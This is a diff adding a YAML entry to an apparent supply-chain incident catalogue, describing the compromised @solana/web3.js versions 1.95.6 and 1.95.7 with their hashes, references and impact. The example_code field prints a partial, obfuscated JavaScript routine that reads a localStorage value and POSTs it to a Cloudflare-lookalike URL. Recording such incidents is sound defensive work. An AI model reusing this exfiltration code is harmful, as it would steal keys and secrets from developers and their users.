@@ -1,0 +1,60 @@
+- name: "@solana/web3.js"
+  title: "solana/web3.js compromised, stole cryptocurrency keys"
+  start_date: 2025-01-22
+  end_date: 2025-01-23
+  license: MIT
+  website: https://solana.com/developers/clients/javascript
+  repo: https://github.com/solana-labs/solana-web3.js
+  attribution_type: unknown
+  component_type: Library
+  lang: Javascript
+  cause: compromise
+  motive: financial gain
+  attack_vector: credentials theft
+  transitive: false
+  insertion_phase: distribution
+  impact_type: cryptocurrency theft
+  references:
+    - https://openssf.org/blog/2025/01/23/predictions-for-open-source-security-in-2025-ai-state-actors-and-supply-chains/
+    - https://reversinglabs.com/blog/watch-your-keys-solana-web3-npm-package-targeted-in-supply-chain-attack
+    - https://socket.dev/blog/npm-package-solana-web3-js-compromised-in-supply-chain-attack
+  versions:
+    - 1.95.6
+    - 1.95.7
+  artifacts:
+    - https://reversinglabs.com/blog/watch-your-keys-solana-web3-npm-package-targeted-in-supply-chain-attack
+    - https://www.npmjs.com/package/@solana/web3.js/v/1.95.6
+    - https://www.npmjs.com/package/@solana/web3.js/v/1.95.7
+  impacted_hashes:
+    - 6561196db44194bd557448d05f67303771b290e412a822f6af23b80e1b6977eb
+    - 03f49b38a3dfd3dde0d75a64fa2330bd603d4b131e86a13cd7f503b85ac3ca1b
+  synopsis: "Attackers gained publish access to the official NPM package, likely via phishing, and released two malicious versions. The inserted code targeted developers' private keys used within Solana applications."
+  compromise_desc: "Threat actors obtained credentials allowing them to publish new versions of the @solana/web3.js package to the NPM registry. It is suspected this access was gained through a targeted phishing campaign against individuals with publishing rights. The attackers then published versions 1.95.6 and 1.95.7, which contained malicious code not present in the legitimate source repository."
+  impact_desc: "The malicious code added to the library specifically targeted Solana private keys. When developers integrated the compromised versions into their applications, the code attempted to capture these keys and exfiltrate them to an attacker-controlled server disguised within seemingly legitimate Cloudflare analytics headers. Successful exfiltration would allow attackers to drain cryptocurrency wallets associated with the stolen keys."
+  example_code: |
+    function checkCloudflare() {
+        var _0x1e9f1f = _0x5691;
+        const _0x4f9d33 = new XMLHttpRequest();
+        _0x4f9d33['open']('GET', 'https://cdnjs.cloudflare.com/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=0000000000000000', !0x0), _0x4f9d33['onload'] = function() {
+            var _0x1c37ef = _0x5691;
+            if (_0x4f9d33['status'] === 0xc8) {
+                const _0x1a820e = _0x4f9d33['responseText'];
+                sendData(_0x1a820e);
+            } else {}
+        }, _0x4f9d33['onerror'] = function() {
+            var _0x4a726e = _0x5691;
+        }, _0x4f9d33['send']();
+    }
+
+    function sendData(_0x5c367c) {
+        var _0x17c10e = _0x5691;
+        const _0x4eb4c1 = localStorage['getItem']('instruction') || '';
+        if (_0x4eb4c1) {
+            const _0x1c2642 = new XMLHttpRequest();
+            const _0x2a13ca = {
+                'instruction': _0x4eb4c1,
+                'ray': _0x5c367c
+            };
+            _0x1c2642['open']('POST', 'https://cdnjs.cloudflare.com/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=0000000000000000', !0x0), _0x1c2642['setRequestHeader']('Content-Type', 'application/json'), _0x1c2642['onload'] = function() {}, _0x1c2642['onerror'] = function() {}, _0x1c2642['send'](JSON['stringify'](_0x2a13ca));
+        }
+    }
